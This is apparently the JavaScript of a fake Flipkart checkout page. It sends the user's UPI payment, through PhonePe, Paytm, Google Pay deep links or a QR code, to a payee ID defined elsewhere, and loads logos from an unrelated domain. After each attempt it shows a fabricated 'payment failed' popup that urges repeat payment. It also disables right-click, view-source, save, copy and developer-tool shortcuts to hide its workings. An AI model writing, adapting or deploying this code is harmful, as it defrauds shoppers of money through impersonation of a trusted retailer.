let selectedApp = 'phonepe';
let codAdvance = 99;
let qrGenerated = false;
let paymentFailureTimer = null;
let paymentAttemptActive = false;
let paymentAppWasHidden = false;

function hidePageLoader() {
  const loader = document.getElementById("fkPageLoader");
  if (loader) {
    loader.classList.add("hide");
    setTimeout(function () {
      loader.style.display = "none";
    }, 300);
  }
}

window.onload = function () {
  updateUI(totalAmount);

  setTimeout(function () {
    document.getElementById('upiMethod').classList.add('active');

    if (!cartSystemEnabled) {
      document.getElementById('priceSummary').classList.add('is-open');
      document.getElementById('priceSummaryHeader').setAttribute('aria-expanded', 'true');
    }
  }, 180);
};

function updateUI(amt) {
  const formatted = '₹' + amt.toLocaleString('en-IN');
  document.getElementById('headerAmount').textContent = formatted;
  document.getElementById('btnAmount').textContent = formatted;
  document.getElementById('qrAmount').textContent = formatted;

  const itemsPriceElement = document.getElementById('itemsPrice');
  const totalPayableElement = document.getElementById('totalPayable');

  if (itemsPriceElement) {
    itemsPriceElement.textContent = '₹' + itemsPrice.toLocaleString('en-IN');
  }

  if (totalPayableElement) {
    totalPayableElement.textContent = formatted;
  }
}

function togglePrice() {
  const summary = document.getElementById('priceSummary');
  const header = document.getElementById('priceSummaryHeader');
  const isOpen = summary.classList.toggle('is-open');
  header.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
}

function toggleMethod(id) {
  const el = document.getElementById(id);

  if (el.classList.contains('active')) {
    el.classList.remove('active');
    return;
  }

  document.querySelectorAll('.method-item').forEach(item => {
    if (item.querySelector('.method-body')) {
      item.classList.remove('active');
    }
  });

  el.classList.add('active');
}

function selectApp(app) {
  selectedApp = app;
  document.querySelectorAll('.upi-option').forEach(option => option.classList.remove('selected'));
  document.querySelectorAll('.upi-radio').forEach(r => r.classList.remove('selected'));
  const selectedRadio = document.getElementById('rd_' + app);
  selectedRadio.classList.add('selected');

  const selectedOption = selectedRadio.closest('.upi-option');
  if (selectedOption) {
    selectedOption.classList.add('selected');
  }

  const isQR = app === 'qr';
  const payButton = document.getElementById('payBtn');

  payButton.style.display = isQR ? 'none' : 'block';

  if (isQR) {
    openQRModal();

    if (!qrGenerated && upiId !== '') {
      generateQR();
    }
  } else {
    closeQRModal();
  }
}

function openQRModal() {
  const qrModal = document.getElementById('qrModal');
  qrModal.classList.add('show');
  qrModal.setAttribute('aria-hidden', 'false');
  document.body.classList.add('qr-modal-open');
}

function closeQRModal() {
  const qrModal = document.getElementById('qrModal');
  qrModal.classList.remove('show');
  qrModal.setAttribute('aria-hidden', 'true');
  document.body.classList.remove('qr-modal-open');
}

function handleQRBackdrop(event) {
  if (event.target === event.currentTarget) {
    closeQRModal();
  }
}

function generateQR() {
  const upiString = `upi://pay?pa=${encodeURIComponent(upiId)}&pn=${encodeURIComponent('Flipkart Payments')}&am=${totalAmount.toFixed(2)}&cu=INR&tn=${encodeURIComponent('Flipkart Payments')}`;
  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=1000x1000&ecc=H&qzone=4&format=png&data=${encodeURIComponent(upiString)}`;

  const qrImg = document.getElementById('qrImage');
  const qrLoading = document.getElementById('qrLoading');
  const downloadLink = document.getElementById('qrDownloadLink');

  qrLoading.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Generating secure QR...';
  qrLoading.style.display = 'block';
  qrImg.style.display = 'none';
  downloadLink.classList.add('is-disabled');
  downloadLink.setAttribute('aria-disabled', 'true');
  downloadLink.removeAttribute('href');

  qrImg.src = qrUrl;

  qrImg.onload = function () {
    qrLoading.style.display = 'none';
    qrImg.style.display = 'block';
    downloadLink.href = qrUrl;
    downloadLink.classList.remove('is-disabled');
    downloadLink.setAttribute('aria-disabled', 'false');
    qrGenerated = true;
  };

  qrImg.onerror = function () {
    qrLoading.textContent = 'Unable to generate the QR code. Please try again.';
    qrLoading.style.display = 'block';
    qrImg.style.display = 'none';
    qrGenerated = false;
  };
}

async function downloadQR(event) {
  event.preventDefault();

  const downloadLink = event.currentTarget;
  const qrImg = document.getElementById('qrImage');

  if (
    downloadLink.classList.contains('is-disabled') ||
    !qrGenerated ||
    !qrImg.src
  ) {
    return;
  }

  const fileName = `upi-payment-qr-${totalAmount.toFixed(2).replace('.', '-')}.png`;

  try {
    const response = await fetch(qrImg.src, { cache: 'no-store' });
    if (!response.ok) throw new Error('QR download failed');

    const qrBlob = await response.blob();
    const objectUrl = URL.createObjectURL(qrBlob);
    const temporaryLink = document.createElement('a');

    temporaryLink.href = objectUrl;
    temporaryLink.download = fileName;
    document.body.appendChild(temporaryLink);
    temporaryLink.click();
    temporaryLink.remove();

    setTimeout(function () {
      URL.revokeObjectURL(objectUrl);
    }, 1000);
  } catch (error) {
    const fallbackLink = document.createElement('a');
    fallbackLink.href = qrImg.src;
    fallbackLink.download = fileName;
    fallbackLink.target = '_blank';
    fallbackLink.rel = 'noopener';
    document.body.appendChild(fallbackLink);
    fallbackLink.click();
    fallbackLink.remove();
  }
}

function clearPaymentFailureTimer() {
  if (paymentFailureTimer !== null) {
    clearTimeout(paymentFailureTimer);
    paymentFailureTimer = null;
  }
}

function schedulePaymentFailure(delay) {
  clearPaymentFailureTimer();
  paymentFailureTimer = setTimeout(showPaymentFailed, delay);
}

function showProcessingPayment() {
  const overlay = document.getElementById('paymentWaitingOverlay');
  const statusLogo = document.getElementById('paymentStatusLogo');
  const paymentLogos = {
    phonepe: { src: 'https://new.sale-start.live/img/phonepe.svg', alt: 'PhonePe' },
    paytm: { src: 'https://new.sale-start.live/img/paytm.svg', alt: 'Paytm' },
    gpay: { src: 'https://new.sale-start.live/img/gpay.svg', alt: 'Google Pay' }
  };
  const selectedLogo = paymentLogos[selectedApp] || { src: 'https://new.sale-start.live/img/upi.svg', alt: 'UPI' };

  if (statusLogo) {
    statusLogo.src = selectedLogo.src;
    statusLogo.alt = selectedLogo.alt;
  }

  clearPaymentFailureTimer();
  paymentAttemptActive = true;
  paymentAppWasHidden = false;
  overlay.classList.add('show');
  overlay.setAttribute('aria-hidden', 'false');
  document.getElementById('paymentFailedPopup').classList.remove('show');
  document.getElementById('paymentFailedPopup').setAttribute('aria-hidden', 'true');
  document.body.classList.add('payment-popup-open');
}

function hideProcessingPayment() {
  const overlay = document.getElementById('paymentWaitingOverlay');
  overlay.classList.remove('show');
  overlay.setAttribute('aria-hidden', 'true');
}

function showPaymentFailed() {
  if (!paymentAttemptActive) return;

  const failedPopup = document.getElementById('paymentFailedPopup');

  paymentAttemptActive = false;
  clearPaymentFailureTimer();
  hideProcessingPayment();
  failedPopup.classList.add('show');
  failedPopup.setAttribute('aria-hidden', 'false');
  document.body.classList.add('payment-popup-open');
}

function cancelPaymentAttempt() {
  paymentAttemptActive = false;
  paymentAppWasHidden = false;
  clearPaymentFailureTimer();
  hideProcessingPayment();
  document.getElementById('paymentFailedPopup').classList.remove('show');
  document.getElementById('paymentFailedPopup').setAttribute('aria-hidden', 'true');
  document.body.classList.remove('payment-popup-open');
}

function tryPaymentAgain() {
  const failedPopup = document.getElementById('paymentFailedPopup');

  paymentAttemptActive = false;
  paymentAppWasHidden = false;
  clearPaymentFailureTimer();
  failedPopup.classList.remove('show');
  failedPopup.setAttribute('aria-hidden', 'true');
  document.body.classList.remove('payment-popup-open');
  document.getElementById('upiMethod').classList.add('active');
}

function processPayment() {
  if (selectedApp === 'qr') {
    openQRModal();
    if (!qrGenerated && upiId !== '') generateQR();
    return;
  }

  if (totalAmount <= 0 || upiId === '') return;

  showProcessingPayment();

  setTimeout(function () {
    if (!paymentAttemptActive) return;

    const tr = "T" + Date.now();
    const amt = totalAmount.toFixed(2);
    let url = '';

    if (selectedApp === 'phonepe') {
      url = `phonepe://pay?pa=${upiId}&pn=Flipkart&am=${amt}&cu=INR&tn=Flipkart%20Payments&tr=${tr}&mc=0000`;
    } else if (selectedApp === 'paytm') {
      url = `paytmmp://pay?pa=${upiId}&pn=Flipkart&am=${amt}&cu=INR&tn=Flipkart%20Payments&tr=${tr}&mc=0000`;
    } else if (selectedApp === 'gpay') {
      url = `tez://upi/pay?pa=${upiId}&pn=Flipkart&am=${amt}&cu=INR&tn=Flipkart%20Payments&tr=${tr}&mc=0000`;
    } else {
      url = `upi://pay?pa=${upiId}&pn=Flipkart&am=${amt}&cu=INR&tn=Flipkart%20Payments&tr=${tr}&mc=0000`;
    }

    window.location.href = url;
    schedulePaymentFailure(15000);
  }, 700);
}

document.addEventListener('visibilitychange', function () {
  if (!paymentAttemptActive) return;

  if (document.visibilityState === 'hidden') {
    paymentAppWasHidden = true;
  } else if (paymentAppWasHidden) {
    schedulePaymentFailure(2200);
  }
});

document.getElementById('cancelPaymentBtn').addEventListener('click', cancelPaymentAttempt);
document.getElementById('tryAgainBtn').addEventListener('click', tryPaymentAgain);

document.addEventListener("contextmenu", function (e) { e.preventDefault(); });
document.addEventListener("keydown", function (e) {
  if (e.ctrlKey && ["u", "U", "s", "S", "c", "C", "p", "P"].includes(e.key)) e.preventDefault();
  if (e.keyCode === 123) e.preventDefault();
  if (e.key === "Escape") closeQRModal();
});
document.addEventListener("dragstart", function (e) { e.preventDefault(); });
document.addEventListener("selectstart", function (e) { e.preventDefault(); });

document.addEventListener("DOMContentLoaded", function () {
  setTimeout(hidePageLoader, 120);
});
// Fallback safety timeout
setTimeout(hidePageLoader, 3000);
